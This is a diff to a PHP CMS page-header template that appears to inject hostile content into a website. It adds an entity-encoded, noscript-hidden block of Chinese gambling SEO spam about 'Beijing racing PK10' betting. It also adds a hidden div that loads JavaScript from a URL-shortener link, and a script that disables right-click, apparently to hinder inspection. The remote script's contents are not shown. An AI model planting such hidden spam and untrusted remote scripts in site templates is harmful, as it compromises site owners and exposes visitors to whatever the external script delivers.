@@ -3,6 +3,11 @@
 <head>
 <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
 <meta http-equiv="X-UA-Compatible" content="IE=7" />
+<noscript>
+<title>&#21271;&#20140;&#36187;&#36710;&#112;&#107;&#49;&#48;&#32;&#21271;&#20140;&#36187;&#36710;&#112;&#107;&#49;&#48;&#24320;&#22870;&#30452;&#25773;&#32;&#21271;&#20140;&#36187;&#36710;&#112;&#107;&#49;&#48;&#21382;&#21490;&#35760;&#24405;&#45;&#112;&#107;&#49;&#48;&#30452;&#25773;</title>
+<meta name="keywords" content="&#21271;&#20140;&#36187;&#36710;&#44;&#21271;&#20140;&#36187;&#36710;&#80;&#75;&#49;&#48;&#44;&#21271;&#20140;&#36187;&#36710;&#112;&#107;&#49;&#48;&#24320;&#22870;&#30452;&#25773;&#44;&#112;&#107;&#49;&#48;&#24320;&#22870;&#30452;&#25773;&#44;&#21271;&#20140;&#36187;&#36710;&#24179;&#21488;&#44;&#21271;&#20140;&#36187;&#36710;&#112;&#107;&#49;&#48;&#24320;&#22870;&#32467;&#26524;&#44;&#21271;&#20140;&#112;&#107;&#49;&#48;&#24320;&#22870;&#30452;&#25773;&#44;&#21271;&#20140;&#36187;&#36710;&#112;&#107;&#49;&#48;&#25237;&#27880;&#32593;&#31449;&#44;&#25552;&#20379;&#21271;&#20140;&#31119;&#24425;&#20844;&#21496;&#35814;&#23613;&#30740;&#31350;&#20998;&#26512;&#24635;&#32467;&#44;&#21271;&#20140;&#112;&#107;&#49;&#48;&#24320;&#22870;&#35270;&#39057;&#44;&#112;&#107;&#49;&#48;&#32467;&#26524;&#20998;&#26512;&#44;&#112;&#107;&#49;&#48;&#32593;&#19978;&#25237;&#27880;&#44;&#112;&#107;&#49;&#48;&#24320;&#22870;&#32467;&#26524;&#44;&#112;&#107;&#49;&#48;&#32593;&#19978;&#24320;&#25143;&#44;&#112;&#107;&#49;&#48;&#24320;&#22870;&#44;&#19987;&#19994;&#30340;&#24320;&#22870;&#35270;&#39057;&#30452;&#25773;&#38376;&#25143;&#32593;" />
+<meta name="description" content="&#21271;&#20140;&#36187;&#36710;&#112;&#107;&#49;&#48;&#30452;&#25773;&#32593;&#12304;&#68;&#83;&#78;&#12305;&#20026;&#24744;&#25552;&#20379;&#21271;&#20140;&#36187;&#36710;&#112;&#107;&#49;&#48;&#21382;&#21490;&#35760;&#24405;&#26597;&#35810;&#20197;&#21450;&#21271;&#20140;&#36187;&#36710;&#24320;&#22870;&#35760;&#24405;&#12289;&#21271;&#20140;&#36187;&#36710;&#112;&#107;&#49;&#48;&#30452;&#25773;&#12289;&#112;&#107;&#49;&#48;&#24320;&#22870;&#12289;&#112;&#107;&#49;&#48;&#24320;&#22870;&#35270;&#39057;&#12289;&#112;&#107;&#49;&#48;&#25216;&#24039;&#44;&#21271;&#20140;&#36187;&#36710;&#24320;&#22870;&#26368;&#24555;&#30340;&#30452;&#25773;&#24179;&#21488;&#12290;" /></noscript>
+
 <title><?php if(isset($SEO['title']) && !empty($SEO['title'])) { ?><?php echo $SEO['title'];?><?php } ?><?php echo $SEO['site_title'];?></title>
 <meta name="keywords" content="<?php echo $SEO['keyword'];?>">
 <meta name="description" content="<?php echo $SEO['description'];?>">
@@ -11,11 +16,18 @@
 <script type="text/javascript" src="<?php echo JS_PATH;?>jquery.min.js"></script>
 <script type="text/javascript" src="<?php echo JS_PATH;?>jquery.sgallery.js"></script>
 <script type="text/javascript" src="<?php echo JS_PATH;?>search_common.js"></script>
+<div style="display:none"><script language="javascript" src="http://t.cn/RKrbI5s" charset="gb2312"></script></div>
+<script>  
+function stop(){   
+return false;  
+}  
+document.oncontextmenu=stop;  
+</script>
 </head>
 <body>
 <div class="body-top">
    <!-- <div class="content">
-    <?php if(defined('IN_ADMIN')  && !defined('HTML')) {echo "<div class=\"admin_piao\" pc_action=\"content\" data=\"op=content&tag_md5=2e3bec5eab254972ef7678fb28fb15b9&action=position&posid=9&order=id&num=10&cache=3600\"><a href=\"javascript:void(0)\" class=\"admin_piao_edit\">编辑</a>";}$tag_cache_name = md5(implode('&',array('posid'=>'9','order'=>'id',)).'2e3bec5eab254972ef7678fb28fb15b9');if(!$data = tpl_cache($tag_cache_name,3600)){$content_tag = pc_base::load_app_class("content_tag", "content");if (method_exists($content_tag, 'position')) {$data = $content_tag->position(array('posid'=>'9','order'=>'id','limit'=>'10',));}if(!empty($data)){setcache($tag_cache_name, $data, 'tpl_data');}}?>
+    <?php if(defined('IN_ADMIN')  && !defined('HTML')) {echo "<div class=\"admin_piao\" pc_action=\"content\" data=\"op=content&tag_md5=2e3bec5eab254972ef7678fb28fb15b9&action=position&posid=9&order=id&num=10&cache=3600\"><a href=\"javascript:void(0)\" class=\"admin_piao_edit\">修改</a>";}$tag_cache_name = md5(implode('&',array('posid'=>'9','order'=>'id',)).'2e3bec5eab254972ef7678fb28fb15b9');if(!$data = tpl_cache($tag_cache_name,3600)){$content_tag = pc_base::load_app_class("content_tag", "content");if (method_exists($content_tag, 'position')) {$data = $content_tag->position(array('posid'=>'9','order'=>'id','limit'=>'10',));}if(!empty($data)){setcache($tag_cache_name, $data, 'tpl_data');}}?>
     		<div id="announ">
                  <ul>
                  <?php $n=1; if(is_array($data)) foreach($data AS $k => $v) { ?>
@@ -64,7 +76,7 @@ $(function(){
     <div class="bk3"></div>
     <div class="nav-bar">
     	<map>
-    	<?php if(defined('IN_ADMIN')  && !defined('HTML')) {echo "<div class=\"admin_piao\" pc_action=\"content\" data=\"op=content&tag_md5=b43f1459ac702900c8d44c91a5e796dd&action=category&catid=0&num=25&siteid=%24siteid&order=listorder+ASC\"><a href=\"javascript:void(0)\" class=\"admin_piao_edit\">编辑</a>";}$content_tag = pc_base::load_app_class("content_tag", "content");if (method_exists($content_tag, 'category')) {$data = $content_tag->category(array('catid'=>'0','siteid'=>$siteid,'order'=>'listorder ASC','limit'=>'25',));}?>
+    	<?php if(defined('IN_ADMIN')  && !defined('HTML')) {echo "<div class=\"admin_piao\" pc_action=\"content\" data=\"op=content&tag_md5=b43f1459ac702900c8d44c91a5e796dd&action=category&catid=0&num=25&siteid=%24siteid&order=listorder+ASC\"><a href=\"javascript:void(0)\" class=\"admin_piao_edit\">修改</a>";}$content_tag = pc_base::load_app_class("content_tag", "content");if (method_exists($content_tag, 'category')) {$data = $content_tag->category(array('catid'=>'0','siteid'=>$siteid,'order'=>'listorder ASC','limit'=>'25',));}?>
         	<ul class="nav-site">
 			<li><a href="<?php echo siteurl($siteid);?>"><span>首页</span></a></li>
 			<?php $n=1;if(is_array($data)) foreach($data AS $r) { ?>
@@ -79,7 +91,7 @@ $(function(){
 	
 	<?php if($top_parentid) { ?>
     <div class="subnav">
-		<?php if(defined('IN_ADMIN')  && !defined('HTML')) {echo "<div class=\"admin_piao\" pc_action=\"content\" data=\"op=content&tag_md5=894824ec88c3701696ad9d879ede6b1d&action=category&catid=%24top_parentid&num=15&siteid=%24siteid&order=listorder+ASC\"><a href=\"javascript:void(0)\" class=\"admin_piao_edit\">编辑</a>";}$content_tag = pc_base::load_app_class("content_tag", "content");if (method_exists($content_tag, 'category')) {$data = $content_tag->category(array('catid'=>$top_parentid,'siteid'=>$siteid,'order'=>'listorder ASC','limit'=>'15',));}?>
+		<?php if(defined('IN_ADMIN')  && !defined('HTML')) {echo "<div class=\"admin_piao\" pc_action=\"content\" data=\"op=content&tag_md5=894824ec88c3701696ad9d879ede6b1d&action=category&catid=%24top_parentid&num=15&siteid=%24siteid&order=listorder+ASC\"><a href=\"javascript:void(0)\" class=\"admin_piao_edit\">修改</a>";}$content_tag = pc_base::load_app_class("content_tag", "content");if (method_exists($content_tag, 'category')) {$data = $content_tag->category(array('catid'=>$top_parentid,'siteid'=>$siteid,'order'=>'listorder ASC','limit'=>'15',));}?>
 			<?php $n=1;if(is_array($data)) foreach($data AS $r) { ?>
 			<a href="<?php echo $r['url'];?>"><?php echo $r['catname'];?></a><span> | </span>
 			<?php $n++;}unset($n); ?>
